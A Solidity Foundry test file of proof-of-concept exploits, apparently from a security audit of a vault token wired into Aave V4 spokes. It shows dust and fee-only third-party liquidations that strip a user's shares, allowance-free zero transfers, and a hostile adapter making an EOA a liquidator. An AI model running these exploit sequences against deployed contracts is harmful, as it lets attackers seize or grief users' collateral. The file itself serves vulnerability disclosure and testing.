// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

// Copyright (c) 2026 Avana Labs

import "./PoCBase.sol";

contract PoCNoFee is VaultTokenPoCBase {
    /// Third-party liquidation that seizes 0 collateral shares succeeds: no token transfer happens.
    function test_poc_thirdPartyDustLiquidationSucceeds() public {
        _pledgeAndBorrowUnderwater();
        uint256 sharesBefore = IAaveV4Spoke(aave.cdpSpoke).getUserSuppliedShares(vtReserveId, proxy);
        uint256 debtBefore = IAaveV4Spoke(aave.cdpSpoke).getUserTotalDebt(debtReserveId, proxy);
        debt.mint(attacker, 1e12);
        vm.startPrank(attacker);
        debt.approve(aave.cdpSpoke, 1e12);
        IAaveV4Spoke(aave.cdpSpoke).liquidationCall(vtReserveId, debtReserveId, proxy, 1e12, false);
        vm.stopPrank();
        assertEq(IAaveV4Spoke(aave.cdpSpoke).getUserSuppliedShares(vtReserveId, proxy), sharesBefore, "shares");
        assertLt(IAaveV4Spoke(aave.cdpSpoke).getUserTotalDebt(debtReserveId, proxy), debtBefore, "debt repaid by 3rd party");
    }

    /// Anyone can emit Transfer(proxy, hub, 0) without allowance.
    function test_poc_zeroTransferFromByAnyone() public {
        _pledge();
        vm.prank(attacker);
        assertTrue(token.transferFrom(proxy, aave.hub, 0));
    }

    /// A hostile Adapter registers an EOA as "proxy" and mints to it; the EOA supplies, and can liquidate others.
    function test_poc_hostileAdapterEoaLiquidator() public {
        _pledgeAndBorrowUnderwater();
        vm.prank(adapter);
        token.addValidProxy(attacker);
        debt.mint(attacker, 1000e18);
        vm.startPrank(attacker);
        debt.approve(aave.cdpSpoke, 1000e18);
        IAaveV4Spoke(aave.cdpSpoke).liquidationCall(vtReserveId, debtReserveId, proxy, 1000e18, false);
        vm.stopPrank();
        assertGt(token.balanceOf(attacker), 0, "EOA holds seized units");
    }
}

contract PoCWithFee is VaultTokenPoCBase {
    function setUp() public override {
        LIQ_FEE = 1000; // 10%
        super.setUp();
    }

    /// With any non-zero liquidationFee, a 1-share liquidation pays the whole share as fee and nothing to the
    /// liquidator: the Hub moves no token, so a third party's liquidationCall succeeds and the user's share moves
    /// to the fee receiver.
    function test_poc_thirdPartyFeeOnlyLiquidationSucceeds() public {
        _pledgeAndBorrowUnderwater();
        uint256 sharesBefore = IAaveV4Spoke(aave.cdpSpoke).getUserSuppliedShares(vtReserveId, proxy);
        uint256 treasuryBefore = IAaveV4Hub(aave.hub).getSpokeAddedShares(_vtAssetId(), aave.treasurySpoke);
        debt.mint(attacker, 1e18);
        vm.startPrank(attacker);
        debt.approve(aave.cdpSpoke, 1e18);
        for (uint256 i; i < 50; ++i) {
            IAaveV4Spoke(aave.cdpSpoke).liquidationCall(vtReserveId, debtReserveId, proxy, 2e12, false);
        }
        vm.stopPrank();
        uint256 sharesAfter = IAaveV4Spoke(aave.cdpSpoke).getUserSuppliedShares(vtReserveId, proxy);
        emit log_named_uint("user share drop", sharesBefore - sharesAfter);
        emit log_named_uint("treasury share gain", IAaveV4Hub(aave.hub).getSpokeAddedShares(_vtAssetId(), aave.treasurySpoke) - treasuryBefore);
        assertEq(token.balanceOf(attacker), 0, "no token moved");
        assertEq(sharesBefore - sharesAfter, 50, "user lost shares without a token transfer");
        assertEq(token.totalSupply(), UNITS, "supply unchanged");
    }
}
